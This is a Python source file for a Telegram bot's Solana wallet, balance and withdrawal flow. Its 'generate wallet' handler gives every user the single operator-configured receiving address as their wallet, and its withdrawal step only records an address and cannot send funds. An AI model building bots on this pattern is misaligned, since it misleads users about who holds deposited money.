"""Receiving wallet information and balance flow."""
from telegram import Update, CallbackQuery
from telegram.ext import ContextTypes
from bot.session import get_session
from bot.keyboards import (
    main_menu_keyboard,
    back_cancel_keyboard,
    wallet_refresh_keyboard,
    generate_wallet_keyboard,
)
from bot.messages import (
    wallet_message, no_wallet_message,
)
from solana_client.wallet import get_wallet_balance
from monitor.deposit import deposit_monitor
from config import RECEIVING_WALLET_ADDRESS
from utils.logger import logger
from solders.pubkey import Pubkey


def _user_wallet(context: ContextTypes.DEFAULT_TYPE) -> dict | None:
    return context.user_data.get("user_wallet")


async def show_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Called from text message handler or /wallet command."""
    uw = _user_wallet(context)
    if not uw:
        await update.effective_message.reply_text(
            no_wallet_message(),
            parse_mode="HTML",
            reply_markup=generate_wallet_keyboard(),
        )
        return

    try:
        balance = await get_wallet_balance(uw["address"])
    except Exception as e:
        logger.warning(f"Could not fetch wallet balance: {e}")
        balance = 0.0

    deposit_monitor.subscribe(update.effective_chat.id)

    await update.effective_message.reply_text(
        wallet_message(uw["address"], balance),
        parse_mode="HTML",
        reply_markup=wallet_refresh_keyboard(),
    )


async def handle_generate_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Callback: reveal the configured deployment wallet to this user."""
    query = update.callback_query
    uw = {"address": RECEIVING_WALLET_ADDRESS}
    context.user_data["user_wallet"] = uw

    try:
        balance = await get_wallet_balance(uw["address"])
    except Exception:
        balance = 0.0

    deposit_monitor.subscribe(update.effective_chat.id)

    await query.edit_message_text(
        wallet_message(uw["address"], balance),
        parse_mode="HTML",
        reply_markup=wallet_refresh_keyboard(),
    )


async def start_withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Start the withdrawal destination-address step."""
    session = get_session(context)
    session["step"] = "withdraw_address"
    session["withdraw"] = {}
    await update.effective_message.reply_text(
        "<b>Withdraw SOL</b>\n\n"
        "Send the Solana address you want to withdraw to.",
        parse_mode="HTML",
        reply_markup=back_cancel_keyboard(),
    )


async def handle_withdraw_address(
    update: Update,
    context: ContextTypes.DEFAULT_TYPE,
    text: str,
) -> None:
    """Validate and retain the requested withdrawal destination."""
    session = get_session(context)
    address = text.strip()
    try:
        Pubkey.from_string(address)
    except Exception:
        await update.effective_message.reply_text(
            "That is not a valid Solana address. Please send the destination address again.",
            reply_markup=back_cancel_keyboard(),
        )
        return

    session["withdraw"]["to"] = address
    session["step"] = "idle"
    await update.effective_message.reply_text(
        "<b>Withdrawal address received</b>\n\n"
        f"Destination: <code>{address}</code>\n\n"
        "The withdrawal cannot be sent yet because this bot has no signing key configured.",
        parse_mode="HTML",
        reply_markup=main_menu_keyboard(),
    )


async def show_wallet_reply(query: CallbackQuery, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Called from wallet_refresh callback — edits existing message in place."""
    uw = _user_wallet(context)
    if not uw:
        await query.answer("No wallet found. Use /wallet to generate one.", show_alert=True)
        return

    try:
        balance = await get_wallet_balance(uw["address"])
    except Exception as e:
        logger.warning(f"Could not fetch wallet balance: {e}")
        balance = 0.0

    try:
        await query.edit_message_text(
            wallet_message(uw["address"], balance),
            parse_mode="HTML",
            reply_markup=wallet_refresh_keyboard(),
        )
    except Exception:
        await query.answer(f"Balance: {balance:.4f} SOL", show_alert=True)


async def cancel_flow(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    session = get_session(context)
    session["step"] = "idle"
    await update.effective_message.reply_text(
        "Cancelled.",
        reply_markup=main_menu_keyboard(),
    )
